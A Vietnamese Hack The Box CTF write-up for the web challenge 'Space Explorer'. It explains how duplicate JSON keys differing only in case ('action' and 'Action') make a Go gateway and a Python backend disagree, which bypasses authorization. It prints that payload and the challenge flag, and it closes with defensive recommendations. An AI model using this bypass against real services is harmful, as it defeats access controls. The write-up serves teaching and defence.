---
title: "Space Explorer"
description: "Bypass xác thực bằng sự khác biệt khi parse JSON giữa Go và Python để truy cập chức năng lấy secure code."
platform: "Hack The Box"
category: "Web"
difficulty: "Easy"
publishedAt: 2026-07-31
tags: ["web", "authentication-bypass", "json", "go", "python", "parser-differential"]
draft: false
featured: true
cover: "/images/space-explorer/space-explorer-04.png"
---

> Write-up này được thực hiện trong môi trường lab có kiểm soát. Chỉ áp dụng các kỹ thuật bên dưới trên hệ thống mà bạn được phép kiểm thử.

## Tổng quan

[Space Explorer](https://app.hackthebox.com/challenges/Space%20Explorer?tab=play_challenge) gồm hai dịch vụ xử lý cùng một request:

- **Sender** viết bằng Go, chịu trách nhiệm kiểm tra action.
- **Receiver** viết bằng Python, xử lý request sau khi Sender cho phép chuyển tiếp.

Hai dịch vụ diễn giải tên khóa JSON khác nhau. Ta có thể lợi dụng điểm không đồng nhất này để làm cho Sender thấy một action hợp lệ, trong khi Receiver lại thấy action đặc quyền.

## Khảo sát endpoint

Ứng dụng gửi request `POST` đến endpoint `/execute`. Với action thông thường `getcosmic`, server trả về thông tin của một phi hành gia:

```http
POST /execute HTTP/1.1
Content-Type: application/json

{
  "action": "getcosmic"
}
```

![Request getcosmic hợp lệ và response từ server](/images/space-explorer/space-explorer-01.png)

Thử gọi trực tiếp action `getSecureCode`:

```http
POST /execute HTTP/1.1
Content-Type: application/json

{
  "action": "getSecureCode"
}
```

Request bị Sender chặn với thông báo:

```text
Access denied: Invalid security clearance
```

![Request getSecureCode bị từ chối](/images/space-explorer/space-explorer-02.png)

## Phân tích source code

Trong `executeHandler`, Sender đọc nguyên body rồi unmarshal JSON vào struct `RequestData`:

```go
body, err := io.ReadAll(r.Body)
if err != nil {
    http.Error(w, "Failed to read request body", http.StatusBadRequest)
    return
}

var requestData RequestData
if err := json.Unmarshal(body, &requestData); err != nil {
    http.Error(w, "Invalid JSON", http.StatusBadRequest)
    return
}
```

Struct chứa trường `Action` được ánh xạ từ khóa JSON `action`:

```go
type RequestData struct {
    Action string `json:"action"`
}
```

Sau đó chương trình kiểm tra giá trị vừa parse:

```go
switch requestData.Action {
case "getcosmic":
    resp, err := http.Post(
        "http://localhost:8081/execute",
        "application/json",
        bytes.NewBuffer(body),
    )
    // ...
case "getSecureCode":
    w.Write([]byte("Access denied: Invalid security clearance"))
default:
    http.Error(w, "Invalid command", http.StatusBadRequest)
}
```

![Source code của executeHandler trong dịch vụ Go](/images/space-explorer/space-explorer-03.png)

Điểm quan trọng nằm ở hai hành vi:

1. `encoding/json` của Go ưu tiên khớp tên khóa chính xác nhưng vẫn chấp nhận khóa không khớp hoa/thường. Nếu nhiều khóa cùng ánh xạ vào một trường, giá trị xuất hiện sau sẽ ghi đè giá trị trước.
2. Sau khi kiểm tra, Sender không serialize lại `requestData` mà chuyển tiếp **nguyên body ban đầu** sang Receiver bằng `bytes.NewBuffer(body)`.

Receiver viết bằng Python lại xử lý dictionary với tên khóa phân biệt hoa/thường. Vì vậy `action` và `Action` là hai khóa độc lập đối với Python.

## Khai thác JSON parser differential

Gửi đồng thời hai khóa chỉ khác nhau ở chữ hoa đầu tiên:

```json
{
  "action": "getSecureCode",
  "Action": "getcosmic"
}
```

Thứ tự của hai khóa là bắt buộc:

- Go ánh xạ cả `action` và `Action` vào `requestData.Action`. Khóa xuất hiện sau khiến giá trị cuối cùng là `getcosmic`, do đó request vượt qua `switch`.
- Sender chuyển tiếp nguyên JSON thay vì dữ liệu đã được chuẩn hóa.
- Python phân biệt hoa/thường và đọc `action` với giá trị `getSecureCode`, từ đó thực thi nhánh trả secure code.

Response trả về flag:

```text
HTB{C0SM1C-BYP4SS}
```

![Khai thác thành công và nhận flag](/images/space-explorer/space-explorer-04.png)

Nếu đảo thứ tự hai khóa, Go sẽ giữ `getSecureCode` làm giá trị cuối cùng và chặn request trước khi nó đến Receiver.

## Nguyên nhân gốc

Lỗ hổng không chỉ đến từ việc so sánh tên khóa có phân biệt hoa/thường hay không. Nguyên nhân hoàn chỉnh là:

- Hai thành phần tin cậy diễn giải cùng một dữ liệu theo quy tắc khác nhau.
- Sender kiểm tra một representation nhưng chuyển tiếp representation khác.
- Request không được chuẩn hóa về một schema duy nhất trước khi đi qua trust boundary.

Đây là một dạng **parser differential** hoặc **inconsistent interpretation**, có thể dẫn đến authentication/authorization bypass khi nhiều dịch vụ dùng các ngôn ngữ hay thư viện parse khác nhau.

## Khuyến nghị phòng thủ

- Sau khi parse và validate, chỉ chuyển tiếp object đã được chuẩn hóa; không chuyển tiếp lại raw body do client cung cấp.
- Áp dụng schema validation nghiêm ngặt và từ chối khóa không xác định, khóa trùng hoặc các biến thể chỉ khác hoa/thường.
- Thực hiện kiểm tra quyền tại chính dịch vụ sở hữu tài nguyên nhạy cảm. Receiver không nên tin rằng request đã an toàn chỉ vì nó đến từ Sender.
- Dùng cùng quy tắc canonicalization và validation trên toàn bộ chuỗi dịch vụ.
- Bổ sung test cho duplicate keys, case variants và các payload có thể được parser ở hai dịch vụ diễn giải khác nhau.

## Tổng kết

Space Explorer minh họa một lỗi logic nhỏ nhưng nguy hiểm trong kiến trúc đa dịch vụ. Chỉ với hai khóa `action` và `Action`, ta tạo được hai cách hiểu khác nhau cho cùng một request: Go thấy `getcosmic` để cho phép chuyển tiếp, còn Python thấy `getSecureCode` để trả về flag.
